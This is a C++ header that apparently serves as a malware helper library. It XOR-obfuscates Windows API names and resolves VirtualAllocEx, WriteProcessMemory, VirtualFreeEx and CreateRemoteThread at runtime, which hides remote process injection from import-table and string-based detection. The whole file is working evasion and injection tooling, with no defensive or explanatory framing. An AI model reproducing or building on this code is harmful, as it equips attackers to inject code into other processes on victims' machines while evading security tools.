#pragma once
#include <windows.h>
#include <string>

namespace RemoteOps {

template<size_t N>
struct ObfStr {
    char data[N];
    constexpr ObfStr(const char(&str)[N]) : data{} {
        for (size_t i = 0; i < N; ++i) data[i] = str[i] ^ 0x47;
    }
    std::string str() const {
        std::string s;
        s.reserve(N);
        for (size_t i = 0; i < N - 1; ++i) s += (char)(data[i] ^ 0x47);
        return s;
    }
};

#define OBF_STR(s) ([]() { static const RemoteOps::ObfStr<sizeof(s)> o(s); return o.str(); }())

inline LPVOID Alloc(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    using pfn = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    static pfn fn = reinterpret_cast<pfn>(GetProcAddress(GetModuleHandleW(L"kernel32.dll"), OBF_STR("VirtualAllocEx").c_str()));
    return fn ? fn(hProcess, lpAddress, dwSize, flAllocationType, flProtect) : nullptr;
}

inline BOOL Write(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    using pfn = BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    static pfn fn = reinterpret_cast<pfn>(GetProcAddress(GetModuleHandleW(L"kernel32.dll"), OBF_STR("WriteProcessMemory").c_str()));
    return fn ? fn(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) : FALSE;
}

inline BOOL Free(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    using pfn = BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD);
    static pfn fn = reinterpret_cast<pfn>(GetProcAddress(GetModuleHandleW(L"kernel32.dll"), OBF_STR("VirtualFreeEx").c_str()));
    return fn ? fn(hProcess, lpAddress, dwSize, dwFreeType) : FALSE;
}

inline HANDLE RemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    using pfn = HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    static pfn fn = reinterpret_cast<pfn>(GetProcAddress(GetModuleHandleW(L"kernel32.dll"), OBF_STR("CreateRemoteThread").c_str()));
    return fn ? fn(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : nullptr;
}

inline FARPROC GetProc(HMODULE hModule, const char* name) {
    return GetProcAddress(hModule, name);
}

}
